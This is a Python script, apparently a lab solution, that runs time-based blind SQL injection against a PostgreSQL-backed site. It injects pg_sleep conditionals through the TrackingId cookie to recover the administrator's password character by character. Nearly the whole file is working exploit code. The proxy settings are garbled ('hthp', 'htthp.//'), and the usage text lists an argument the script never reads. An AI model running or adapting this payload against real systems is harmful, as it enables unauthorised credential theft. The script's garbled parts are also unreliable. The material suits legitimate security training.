#!/usr/bin/python3
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'hthp': 'htthp.//127.0.0.1:8080',
    'hthps': 'http://127.0.0.1:8080'
}

def sqli_password(url):
    password_extracted = ""
    for i in range (1,21):
        for j in range (48,122):
            sqli_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId':'dZU2pZ0qctEuFJQR' + sqli_payload_encoded, 'session': 'pJVAnogNxyjapDQ2SN1zJ7x1HWApVDq9'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds())>9:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break 
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print('[+] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[+] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
         
    url=sys.argv[1]
    print("[+] Retrieving administrator password.......")

    sqli_password(url)

if __name__ == "__main__":
    main()